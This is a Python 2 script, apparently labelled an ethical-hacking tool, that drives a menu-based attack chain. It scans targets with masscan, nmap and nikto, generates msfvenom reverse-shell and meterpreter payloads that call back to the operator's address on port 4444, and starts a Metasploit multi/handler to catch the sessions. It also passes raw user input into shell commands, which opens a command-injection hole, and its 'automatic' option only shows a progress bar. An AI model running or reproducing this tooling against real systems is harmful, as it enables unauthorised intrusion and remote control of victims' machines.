import os
import sys
import socket
from time import sleep

def main():
    while(True):
        welcome = "\n\t***HELLO, S[crip]TRANGER!***\n"
        if os.path.exists("README.md"):
            readmefile = open("README.md", "r")
            readme = readmefile.read()
            readmefile.close()
        else:
            readme = "For more information about this script visit https://github.com/EngelTz/Malware-script-EH"

        os.system('cls' if os.name == 'nt' else 'clear')
        print welcome
        print readme
        print "--------------------------------------------------------------\n"
        print "In order to execute the attack, it is required to do the next actions:\n\
    1) Identify vulnerable target(s)\n\
    2) Find information and vulnerabilities from the target(s)\n\
    3) Exploit vulnerabilities\n\
    4) Do everything automatically\n\
    5) Exit\n\
\nSelect an option: ",
        option = input()
        if option < 1 or option > 5:
            for i in range(2,0,-1):
                sys.stdout.write ("\rWrong decision, man u_u... wait ")
                sys.stdout.write (str(i))
                sys.stdout.write (" seconds")
                sys.stdout.flush()
                sleep(1)
        else:
            if   option == 1: findTargets_Menu()
            elif option == 2: getVulnerabilities_Menu()
            elif option == 3: exploitVulnerabilities_Menu()
            elif option == 4: automaticExploit_Menu()
            return


######################### FIND VULNERABLE TARGETS #########################

def findTargets_Menu():
    while(True):
        os.system('cls' if os.name == 'nt' else 'clear')
        print "\n\t***IDENTIFY VULNERABLE TARGET(S)***\n"
        print "You can identify a vulnerable target according to:\n\
    1) A specific IP address (i.e. 192.168.12.34)\n\
    2) A network range (i.e. 192.168.12.0/24)\n\
    3) A file with specifics IP addresses (i.e. 'targets.txt')\n\
    4) Back\n"

        print "So... what do you decide? ",
        option = input()
        if option < 1 or option > 4:
            for i in range(2,0,-1):
                sys.stdout.write ("\rWrong decision, man u_u... wait ")
                sys.stdout.write (str(i))
                sys.stdout.write (" seconds")
                sys.stdout.flush()
                sleep(1)
        else:
            if option == 1:
                print "\nWho is your target? (A valid IPv4 address): ",
                target = raw_input()
                if len(target) < 7 or len(target) > 15:
                    print "Wrong IPv4 address"
                    sleep(2)
                else:
                    findTargets(target)
                    break
            elif option == 2:
                print "\nWho are your targets? (A valid IPv4 address range): ",
                target = raw_input()
                if len(target) < 9 or len(target) > 18:
                    print "Wrong IPv4 address range"
                    sleep(2)
                else:
                    findTargets(target)
                    break
            elif option == 3:
                print "\nWhere are your targets? (A valid .txt file): ",
                target = raw_input()
                if os.path.exists(target):
                    textfile = open(target, "r")
                    targets = textfile.readlines()
                    textfile.close()
                    begin = 0
                    for target in targets:
                        target = target.replace('\n','')
                        findTargets(target, begin, len(targets)*4)
                        begin += 4
                    break
                else:
                    print "I did not found that file. Sure is wrote correctly?"
                    sleep(3)
            elif option == 4:
                main()
                break


def findTargets(target, begin=0, end=4):
    if target is not 0:
        print "\n\n ----- TARGET", target, "-----"
        print "\nMASSCAN"
        progressBar(begin+1,end)
        print
        os.system('masscan ' + target + ' -p80 | grep -o "[1-255].*" > masscanResult.txt')
        if os.path.exists("masscanResult.txt"):
            print "Open ports found. The vulnerable IP addresses were saved in 'masscanResult.txt'."
        else:
            print "\nMasscan did not found any port 80 open."
        progressBar(begin+2,end)

        print "\nNMAP"
        progressBar(begin+3,end)
        print
        os.system('nmap ' + target + ' | grep -o "*open*" > nmapResults.txt')
        if os.path.exists("nmapResults.txt"):
            print "\nOpen ports found. The vulnerable IP addresses were saved in 'nmapResults.txt'."
        else:
            print "\nnmap did not found any port open."
        progressBar(begin+4,end)


########################### GET VULNERABILITIES ###########################

def getVulnerabilities_Menu():
    while(True):
        os.system('cls' if os.name == 'nt' else 'clear')
        print "\n\t***FIND VULNERABILITIES***\n"
        print "You can find vulnerabilities of:\n\
    1) A server (i.e. 192.168.12.34)\n\
    2) A web page (i.e. example.com)\n\
    3) Back\n"

        print "So... what do you decide? ",
        option = input()
        if option < 1 or option > 3:
            for i in range(2,0,-1):
                sys.stdout.write ("\rWrong decision, man u_u... wait ")
                sys.stdout.write (str(i))
                sys.stdout.write (" seconds")
                sys.stdout.flush()
                sleep(1)
        else:
            if option == 1:
                print "\nWho is your target? (A valid IPv4 address): ",
                target = raw_input()
                if len(target) < 7 or len(target) > 15:
                    print "Wrong IPv4 address"
                    sleep(2)
                else:
                    getVulnerabilities(target)
                    break
            elif option == 2:
                print "\nWho is your target? (A valid web page): ",
                target = raw_input()
                if '.' not in target:
                    print "Wrong... Did you forget the domain?"
                    sleep(2)
                else:
                    getVulnerabilities(target)
                    break
            elif option == 3:
                main()
                break


def getVulnerabilities(target):
    print "\n\n ----- TARGET", target, "-----"
    print "\nNIKTO"
    progressBar(0,100)
    print
    os.system('nikto -h ' + target + ' -o niktoResult.txt &')
    for i in range(1,100):
        progressBar(i,100)
        sleep(1.5)
    if os.path.exists("niktoResult.txt"):
        print "Nikto vulnerabilities detected dumped into 'niktoResult.txt'."
    else:
        print "\nNikto did not found any vulnerability."
    progressBar(100,100)


######################### EXPLOIT VULNERABILITIES #########################

def exploitVulnerabilities_Menu():
    while(True):

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("9.9.9.9", 80))
        lhost = s.getsockname()[0]

        os.system('cls' if os.name == 'nt' else 'clear')
        print "\n\t***EXPLOIT VULNERABILITIES***\n"
        print "You can exploit vulnerabilities with:\n\
    1) Metasploit\n\
    2) Msfvenom\n\
    3) Back\n"

        print "So... what do you decide? ",
        option = input()
        if option < 1 or option > 3:
            for i in range(2,0,-1):
                sys.stdout.write ("\rWrong decision, man u_u... wait ")
                sys.stdout.write (str(i))
                sys.stdout.write (" seconds")
                sys.stdout.flush()
                sleep(1)
        else:
            if option == 1:
                print "\n\t----- METASPLOIT -----\n"
                print "Which module want to use?\n\
    1) osx/x64/shell_reverse_tcp\n\
    2) linux/x64/shell_reverse_tcp\n\
    3) windows/x64/meterpreter/reverse_tcp\n\
    4) Back\n"
                print "\nSelect module: ",
                target = input()
                if target < 1 or target > 4:
                    print "That module does no exist!"
                    sleep(2)
                else:
                    metasploit(target, lhost)
                    break
            elif option == 2:
                print "\n\t----- MSFVENOM -----\n"
                print "Which module want to use?\n\
    1) osx/x64/shell_reverse_tcp\n\
    2) linux/x64/shell_reverse_tcp\n\
    3) windows/x64/meterpreter/reverse_tcp\n\
    4) Back\n"
                print "\nSelect module: ",
                target = input()
                if target < 1 or target > 4:
                    print "That module does no exist!"
                    sleep(2)
                else:
                    if target == 1:
                        os.system("msfvenom -p osx/x64/shell_reverse_tcp LHOST=" + lhost + " LPORT=4444 -f bash -o meterpreter")
                    if target == 2:
                        os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + lhost + " LPORT=4444 -f bash -o meterpreter")
                    if target == 3:
                        os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=4444 -f exe -o meterpreter.exe")
                    print "Succesfully created payload with the name 'meterpreter' :)"
                    break
            elif option == 3:
                main()
                break

def metasploit(target, lhost):
    if target == 1:
        target = "osx/x64/shell_reverse_tcp"
    if target == 2:
        target = "linux/x64/shell_reverse_tcp"
    if target == 3:
        target = "windows/x64/meterpreter/reverse_tcp"
    print "\n\n ----- USING MODULE ", target, "-----"
    progressBar(0,100)
    print
    os.system('msfconsole -q -x "use multi/handler;set payload ' + target + ';set LHOST ' + lhost + ';set ExitOnSession false;exploit -j -z"')
    for i in range(1,100):
        progressBar(i,99)
        sleep(0.01)
    progressBar(100,100)


############################ EVERYTHING BEFORE ############################

def automaticExploit_Menu():
    for i in range(0,100):
        progressBar(i,99)
        sleep(0.05)


#From Aravind Voggu
def progressBar(value, endvalue):
    size = os.popen('stty size', 'r').read().split()
    bar_length = int(size[1]) - 6
    percent = float(value) / endvalue
    arrow = '|' * int(round(percent * bar_length))
    spaces = '-' * (bar_length - len(arrow))

    sys.stdout.write("\r[{0}]{1}%".format(arrow + spaces, int(round(percent * 100))))
    sys.stdout.flush()

if __name__ == '__main__':
    main()
